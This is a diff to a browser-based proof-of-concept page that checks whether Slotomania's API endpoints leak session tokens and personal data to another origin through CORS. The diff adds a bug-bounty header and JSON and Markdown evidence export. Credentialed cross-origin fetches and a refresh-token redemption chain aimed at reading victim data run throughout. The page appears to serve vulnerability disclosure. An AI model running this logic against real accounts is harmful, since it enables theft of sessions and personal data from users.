@@ -346,7 +346,7 @@
         <section class="hero">
             <div class="badge">Authorized own-account verifier</div>
             <div>
-                <h1>CORS verifier</h1>
+                <h1>REAL CORS verifier</h1>
                 <p>
                     This page validates whether Slotomania endpoints are readable cross-origin from your hosted GitHub
                     Pages origin. It keeps everything local in this tab and is intended for your own authorized test
@@ -409,6 +409,8 @@
                 <button class="primary" id="chainBtn">Run refresh-token chain</button>
                 <button class="primary" id="cookieBtn">Run cookie-only checks</button>
                 <button class="secondary" id="manualBtn">Run manual-token checks</button>
+                <button class="secondary" id="exportJsonBtn" disabled>Export JSON evidence</button>
+                <button class="secondary" id="exportMdBtn" disabled>Export Markdown summary</button>
                 <button class="ghost" id="clearBtn">Clear results</button>
             </div>
 
@@ -439,12 +441,17 @@
         const chainBtn = document.getElementById("chainBtn");
         const cookieBtn = document.getElementById("cookieBtn");
         const manualBtn = document.getElementById("manualBtn");
+        const exportJsonBtn = document.getElementById("exportJsonBtn");
+        const exportMdBtn = document.getElementById("exportMdBtn");
         const clearBtn = document.getElementById("clearBtn");
         const useCookiesEl = document.getElementById("useCookies");
         const maskSensitiveEl = document.getElementById("maskSensitive");
         const sessionIdEl = document.getElementById("sessionId");
         const sessionTokenEl = document.getElementById("sessionToken");
         const refreshTokenEl = document.getElementById("refreshToken");
+        const BUG_BOUNTY_HEADER_VALUE = "True";
+
+        let lastRun = null;
 
         currentOriginEl.textContent = window.location.href;
 
@@ -609,11 +616,20 @@
             chainBtn.disabled = busy;
             cookieBtn.disabled = busy;
             manualBtn.disabled = busy;
+            exportJsonBtn.disabled = busy || !lastRun;
+            exportMdBtn.disabled = busy || !lastRun;
+        }
+
+        function updateExportState() {
+            exportJsonBtn.disabled = !lastRun;
+            exportMdBtn.disabled = !lastRun;
         }
 
         function clearResults() {
+            lastRun = null;
             summaryEl.innerHTML = "";
             resultsEl.innerHTML = '<div class="empty">No checks have been run yet.</div>';
+            updateExportState();
         }
 
         function maskString(value) {
@@ -690,6 +706,7 @@
 
         function buildHeaders(test) {
             const headers = new Headers();
+            headers.set("X-Bug-Bounty", BUG_BOUNTY_HEADER_VALUE);
 
             if (test.method === "POST") {
                 headers.set("Content-Type", "application/json");
@@ -720,13 +737,94 @@
             return JSON.parse(atob(padded));
         }
 
+        function classifyRun(mode, items) {
+            const readableSensitive = items.some((item) => item.ok && (item.piiPaths.length || item.authPaths.length));
+            if (mode === "cookie" && readableSensitive) {
+                return "Strongest path found: browser-managed auth produced readable sensitive data.";
+            }
+            if (mode === "chain" && readableSensitive) {
+                return "Validated token-redemption chain: readable auth or account data after cross-origin session minting.";
+            }
+            if (mode === "manual" && readableSensitive) {
+                return "Manual-token validation succeeded, but this still depends on attacker-supplied auth material.";
+            }
+            if (mode === "cookie") {
+                return "No standalone cookie-only compromise evidence yet.";
+            }
+            return "Readable responses were observed, but the current run does not prove standalone victim compromise.";
+        }
+
+        function persistRun(mode, items) {
+            lastRun = {
+                mode,
+                ranAt: new Date().toISOString(),
+                origin: window.location.href,
+                bugBountyHeader: BUG_BOUNTY_HEADER_VALUE,
+                classification: classifyRun(mode, items),
+                items
+            };
+            updateExportState();
+        }
+
+        function downloadText(filename, content, mimeType) {
+            const blob = new Blob([content], { type: mimeType });
+            const url = URL.createObjectURL(blob);
+            const anchor = document.createElement("a");
+            anchor.href = url;
+            anchor.download = filename;
+            document.body.appendChild(anchor);
+            anchor.click();
+            anchor.remove();
+            URL.revokeObjectURL(url);
+        }
+
+        function buildMarkdownReport() {
+            if (!lastRun) {
+                return "";
+            }
+
+            const lines = [
+                "# Slotomania CORS Validation",
+                "",
+                `- Run time: ${lastRun.ranAt}`,
+                `- Origin: ${lastRun.origin}`,
+                `- Validation mode: ${lastRun.mode}`,
+                `- X-Bug-Bounty header: ${lastRun.bugBountyHeader}`,
+                `- Assessment: ${lastRun.classification}`,
+                ""
+            ];
+
+            for (const item of lastRun.items) {
+                lines.push(`## ${item.title}`);
+                lines.push("");
+                lines.push(`- URL: ${item.url}`);
+                lines.push(`- Status: ${item.status} ${item.statusText}`);
+                lines.push(`- Request auth mode: ${item.requestAuthMode}`);
+                lines.push(`- Credentials mode: ${item.credentialsMode}`);
+                lines.push(`- Body readable by JS: ${item.bodyReadable ? "yes" : "no"}`);
+                lines.push(`- Content-Type: ${item.contentType || "none"}`);
+                lines.push(`- Response size: ${item.rawLength} bytes`);
+                lines.push(`- Time: ${item.elapsedMs} ms`);
+                lines.push(`- PII-like paths: ${item.piiPaths.length ? item.piiPaths.join(", ") : "none"}`);
+                lines.push(`- Auth-like paths: ${item.authPaths.length ? item.authPaths.join(", ") : "none"}`);
+                lines.push("");
+                lines.push("```json");
+                lines.push(item.preview);
+                lines.push("```");
+                lines.push("");
+            }
+
+            return lines.join("\n");
+        }
+
         async function runFetch(test, options = {}) {
             const headers = options.overrideHeaders || buildHeaders(test);
+            const credentialsMode = options.overrideCredentials || (useCookiesEl.checked ? "include" : "omit");
             const init = {
                 method: test.method,
                 mode: "cors",
                 cache: "no-store",
-                credentials: options.overrideCredentials || (useCookiesEl.checked ? "include" : "omit"),
+                credentials: credentialsMode,
                 headers
             };
 
@@ -761,6 +859,9 @@
                     piiPaths: [...new Set(signals.pii)].slice(0, 10),
                     authPaths: [...new Set(signals.auth)].slice(0, 12),
                     contentType: response.headers.get("content-type") || "",
+                    bodyReadable: true,
+                    credentialsMode,
+                    requestAuthMode: options.requestAuthMode || "cookies-or-none",
                     preview: parsed ? JSON.stringify(sanitizePayload(parsed), null, 2) : text.slice(0, 2000),
                     rawLength: text.length
                 };
@@ -775,6 +876,9 @@
                     piiPaths: [],
                     authPaths: [],
                     contentType: "",
+                    bodyReadable: false,
+                    credentialsMode,
+                    requestAuthMode: options.requestAuthMode || "cookies-or-none",
                     preview: `Fetch failed: ${error.message}`,
                     rawLength: 0
                 };
@@ -785,6 +889,8 @@
             const successCount = items.filter((item) => item.ok).length;
             const piiHits = items.filter((item) => item.piiPaths.length > 0).length;
             const authHits = items.filter((item) => item.authPaths.length > 0).length;
+            const readableCount = items.filter((item) => item.bodyReadable).length;
+            const assessment = lastRun ? lastRun.classification : "Run a validation mode to generate an assessment.";
 
             summaryEl.innerHTML = `
                 <div class="summary-card">
@@ -802,6 +908,14 @@
                 <div class="summary-card">
                     <strong>Cookie mode</strong>
                     <div class="small">${useCookiesEl.checked ? "include" : "omit"}</div>
+                </div>
+                <div class="summary-card">
+                    <strong>JS-readable bodies</strong>
+                    <div class="small">${readableCount}</div>
+                </div>
+                <div class="summary-card">
+                    <strong>Assessment</strong>
+                    <div class="small">${assessment}</div>
                 </div>
             `;
         }
@@ -836,7 +950,7 @@
                     <div class="kv">
                         <div>
                             <span>Response facts</span>
-                            <div>${item.contentType || "no content-type"} | ${item.rawLength} bytes | ${item.elapsedMs} ms</div>
+                            <div>${item.contentType || "no content-type"} | ${item.rawLength} bytes | ${item.elapsedMs} ms | auth=${item.requestAuthMode} | creds=${item.credentialsMode} | readable=${item.bodyReadable ? "yes" : "no"}</div>
                         </div>
                         <div>
                             <span>PII-like fields</span>
@@ -891,9 +1005,12 @@
 
             const items = [];
             for (const test of activeTests) {
-                items.push(await runFetch(test));
+                items.push(await runFetch(test, {
+                    requestAuthMode: test.needsSessionHeaders ? "manual-session-headers" : "cookies-or-none"
+                }));
             }
 
+            persistRun(tests === COOKIE_TESTS ? "cookie" : "manual", items);
             renderSummary(items);
             renderResults(items);
             setBusy(false);
@@ -938,7 +1055,10 @@
                     mode: "cors",
                     cache: "no-store",
                     credentials: "omit",
-                    headers: new Headers({ "Content-Type": "application/json" }),
+                    headers: new Headers({
+                        "Content-Type": "application/json",
+                        "X-Bug-Bounty": BUG_BOUNTY_HEADER_VALUE
+                    }),
                     body: JSON.stringify(refreshBody)
                 });
                 refreshText = await refreshResponse.text();
@@ -958,9 +1078,13 @@
                     piiPaths: [],
                     authPaths: [],
                     contentType: "",
+                    bodyReadable: false,
+                    credentialsMode: "omit",
+                    requestAuthMode: "refresh-jwt",
                     preview: `Fetch failed: ${error.message}`,
                     rawLength: 0
                 };
+                persistRun("chain", [failedRefresh]);
                 renderSummary([failedRefresh]);
                 renderResults([failedRefresh]);
                 setBusy(false);
@@ -978,6 +1102,9 @@
                 piiPaths: [...new Set(refreshSignals.pii)].slice(0, 10),
                 authPaths: [...new Set(refreshSignals.auth)].slice(0, 12),
                 contentType: refreshResponse.headers.get("content-type") || "",
+                bodyReadable: true,
+                credentialsMode: "omit",
+                requestAuthMode: "refresh-jwt",
                 preview: refreshJson ? JSON.stringify(sanitizePayload(refreshJson), null, 2) : refreshText.slice(0, 2000),
                 rawLength: refreshText.length
             };
@@ -1019,7 +1146,8 @@
             for (const test of CHAIN_TESTS) {
                 items.push(await runFetch(test, {
                     overrideHeaders: freshHeaders,
-                    overrideCredentials: "omit"
+                    overrideCredentials: "omit",
+                    requestAuthMode: "fresh-session-headers"
                 }));
             }
 
@@ -1033,6 +1161,9 @@
                     contentType: "application/json",
                     rawLength: 0,
                     piiPaths: [],
+                    bodyReadable: true,
+                    credentialsMode: "omit",
+                    requestAuthMode: "derived-session-context",
                     authPaths: [
                         "$.sessionToken",
                         "$.refreshToken",
@@ -1047,6 +1178,7 @@
                 }
             ];
 
+            persistRun("chain", [...chainSummary, ...items]);
             renderSummary([...chainSummary, ...items]);
             renderResults([...chainSummary, ...items]);
             setBusy(false);
@@ -1055,7 +1187,28 @@
         chainBtn.addEventListener("click", runRefreshChain);
         cookieBtn.addEventListener("click", () => runTests(COOKIE_TESTS));
         manualBtn.addEventListener("click", () => runTests(MANUAL_TESTS));
+        exportJsonBtn.addEventListener("click", () => {
+            if (!lastRun) {
+                return;
+            }
+            downloadText(
+                `slotomania-cors-evidence-${Date.now()}.json`,
+                JSON.stringify(lastRun, null, 2),
+                "application/json"
+            );
+        });
+        exportMdBtn.addEventListener("click", () => {
+            if (!lastRun) {
+                return;
+            }
+            downloadText(
+                `slotomania-cors-summary-${Date.now()}.md`,
+                buildMarkdownReport(),
+                "text/markdown"
+            );
+        });
         clearBtn.addEventListener("click", clearResults);
+        updateExportState();
     </script>
 </body>
 
